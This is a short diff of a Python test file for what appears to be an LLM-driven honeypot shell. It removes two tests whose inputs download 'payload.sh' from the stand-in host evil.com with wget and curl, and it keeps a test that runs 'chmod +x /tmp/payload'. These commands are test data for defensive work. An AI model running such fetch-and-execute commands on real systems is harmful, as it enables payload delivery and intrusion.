@@ -601,18 +601,6 @@ class TestLlmShell:
         assert result is None or result == ""
 
     @pytest.mark.asyncio
-    async def test_wget_redirect(self):
-        result = await hp.llm_shell([], "wget http://evil.com/payload.sh", "system prompt")
-        assert "Saving to:" in result
-        assert "100%" in result
-
-    @pytest.mark.asyncio
-    async def test_curl_redirect(self, monkeypatch):
-        monkeypatch.setattr(hp, "_log_file", Path("/dev/null"))
-        result = await hp.llm_shell([], "curl http://evil.com/payload.sh -o out", "system prompt")
-        assert "Saving to:" in result
-
-    @pytest.mark.asyncio
     async def test_chmod_returns_empty(self):
         result = await hp.llm_shell([], "chmod +x /tmp/payload", "system prompt")
         assert result == ""
